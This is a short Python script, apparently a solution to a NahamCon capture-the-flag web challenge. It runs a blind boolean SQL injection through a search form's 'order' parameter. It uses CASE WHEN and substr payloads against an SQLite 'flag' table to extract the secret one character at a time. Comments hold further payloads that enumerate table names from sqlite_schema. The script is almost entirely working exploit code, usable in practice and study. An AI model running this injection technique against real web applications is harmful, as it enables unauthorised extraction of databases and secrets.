#!/usr/bin/env python3
import requests 
import string
# username 
url = 'http://challenge.nahamcon.com:31424/'
leake_data = list('')
blocklist = ["%"+"^"+"&"+"*"+"$"+"#"+"@","-","/","\\","=","+",":","'",'"','[',']']
while True:
    for characters in string.printable:
        if  characters not in blocklist :        
            dd = ''.join(leake_data) 
            start = len(leake_data) + 1
            
            t   = requests.post(          #CASE WHEN (select substr(name,1,1) from sqlite_schema where type='table' and name like 'f%')='a'
            url,                          #"(case when (SELECT 1=1) then name else atomic_number end ) --,name"
            data ={'search': "".format(dd,characters), 'order': f"(case when (SELECT substr(flag,{start},1) from flag where flag like '%%')='{characters}' then name else atomic_number end ) --,name"}   
            )  
            r = t.text.split('<td>')
            print("trying : "+''.join(leake_data)+characters)
            if "<title>500" in t.text:
                print("500 error")
                                                        #  =============  order by name << this main value is True   =============
            elif '<td style="width:20%">13</td>' in r[1]:                 # <td style="width:10%">Al</td> 
                                                                          # <td style="width:20%">13</td>  
                leake_data.append(characters)
                # print(t.text)
                break